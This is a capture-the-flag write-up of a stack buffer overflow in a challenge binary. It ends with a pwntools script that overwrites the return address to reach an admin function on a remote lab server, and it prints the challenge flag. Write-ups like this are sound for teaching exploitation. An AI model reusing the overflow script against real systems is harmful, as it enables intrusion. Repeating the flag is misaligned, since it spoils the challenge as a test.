# Space pirate: Going Deeper
> Write-up author: jon-brandy
## DESCRIPTION:
We are inside D12! We bypassed the scanning system, and now we are right in front of the Admin Panel. 
The problem is that there are some safety mechanisms enabled so that not everyone can access the admin panel and become the user right below Draeger. 
Only a few of his intergalactic team members have access there, and they are the mutants that Draeger trusts. 
Can you disable the mechanisms and take control of the Admin Panel?

## HINT:
- NONE
## STEPS:
1. First, unzipt the `.zip` file given, then jump to the extracted directory.

> INSIDE

![image](https://user-images.githubusercontent.com/70703371/209360739-725aaa02-8f61-4120-8fe3-a89e10e29d4f.png)


2. Check the `sp` file type.

![image](https://user-images.githubusercontent.com/70703371/209360801-f1ee46de-d6b9-441f-8716-d216f4f64f87.png)


3. It's a 64 bit binary file, dynamically linked, and not stripped.
4. Since it's not stripped, it's easier for us to debug the binary when decompiled.
5. Now, let's check the binary's protection.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209361035-8d8bd5e7-d939-4437-b3cd-6a96cdd17b8c.png)


6. **No canary found** and **no PIE**.
7. Anyway let's run the binary in gdb.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209473239-d41f9b73-858d-4dd0-9223-5986a21548f4.png)


8. If we pressed 1, we prompted an input, let's paste 1024 cyclic pattern here.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209473266-0c10cff2-bbd9-48c5-a3ac-68f72b55c73f.png)


9. Great! The program crashed.
10. Now utilize the 4 RBP characters from behind to find the correct bytes to overflow the buffer.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209473284-21caf80f-6b5e-43bb-a01d-a7a47c830810.png)


11. Notice here, since we don't have the RSP offset, so let's use the pattern buffer found -1. -> 56 padding bytes.

![image](https://user-images.githubusercontent.com/70703371/209473313-4a1164a2-86a0-4472-810b-d4e975dcab00.png)


12. Anyway let's decompile the file and open the `main()` function.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/209363588-d2254810-2ab9-4416-b90f-70456ee2c0e1.png)

13. From the 3 functions, the `admin_panel()` function caught my attention.

> ADMIN_PANEL

![image](https://user-images.githubusercontent.com/70703371/209363750-d34aaf84-613b-4005-9ce2-1594255bcf83.png)


14. Based from the source code, the read function reads 57 bytes and the program comparing the admin username with the newline after it not a NULL character.
15. By the way, actually we can get the `system()` address and add that as the return address.
16. Here is the full script.

```py
from pwn import *
import os

os.system('clear')
context.log_level = 'debug'
sh = remote('144.126.232.222',30851)
p = b'A' * 56
p += p64(4197138) #0x400b12 # system address
sh.sendlineafter(b'>>', b'1')
sh.sendlineafter(b':', p)

sh.interactive()

```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/209473377-a05186c4-8306-45a1-b6c5-3c2fbc0785dc.png)


17. Got the flag!

## FLAG

```
HTB{d1g_1n51d3..u_Cry_cry_cry}
```
